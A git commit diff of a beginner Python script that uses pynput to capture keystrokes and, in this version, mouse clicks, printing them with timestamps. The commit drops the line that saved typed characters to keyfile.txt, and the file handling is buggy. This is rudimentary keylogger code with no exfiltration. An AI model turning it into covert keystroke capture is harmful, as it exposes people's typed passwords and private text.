00c9864534a990bf942a0540c362db622ecdf9e6
MasonLundquist <maslundq73@gmail.com>
2022-09-19 17:47:32 -0600

    1.1

--- Main.py
+++ Main.py
@@ -1,21 +1,33 @@
-from pynput import keyboard
+from pynput import keyboard, mouse
 
 import datetime as dt
 
-current_datetime = dt.datetime.now()
-
-print(current_datetime)
-
 def keyPressed(key):
     print(str(key))
+    current_datetime = dt.datetime.now()
+    print(current_datetime)
     with open("keyfile.txt", 'a') as logKey:
         try:
-            char=key.char
-            logKey.write(char)
-        except:
-            print("Error getting char")
+            print('alphanumeric key {0} pressed'.format(
+            key.char))
+        except AttributeError:
+            print('special key {0} pressed'.format(
+            key))
+        logKey.close
+            
+def mouseClicked(x, y, button, pressed):
+    print("It clicked")
+    current_datetime = dt.datetime.now()
+    print(current_datetime)
+    with open("keyfile.txt", 'a') as mouseLog:
+        print('mouse was clicked')
+        mouseLog.close
             
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+    keyListener = keyboard.Listener(on_press=keyPressed)
+    keyListener.start()
+    mouseListener = mouse.Listener(on_click=mouseClicked)
+    mouseListener.start()
+    
+    input()   
+
